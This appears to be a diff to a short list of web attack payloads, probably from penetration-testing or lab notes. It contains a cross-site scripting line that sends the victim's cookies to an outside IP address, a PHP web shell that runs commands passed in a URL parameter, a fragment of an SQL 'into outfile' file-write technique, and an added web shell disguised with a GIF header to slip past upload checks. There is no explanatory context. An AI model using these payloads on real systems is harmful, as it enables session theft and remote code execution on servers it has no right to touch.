@@ -8,3 +8,7 @@ new Image().src="http://10.11.0.5/bogus.php?output="+document.cookie;
 <?php echo shell_exec($_GET['cmd']);?>
 
 into outfile 
+
+
+GIF89; 
+<?php echo shell_exec($_GET["cmd"]);?> 
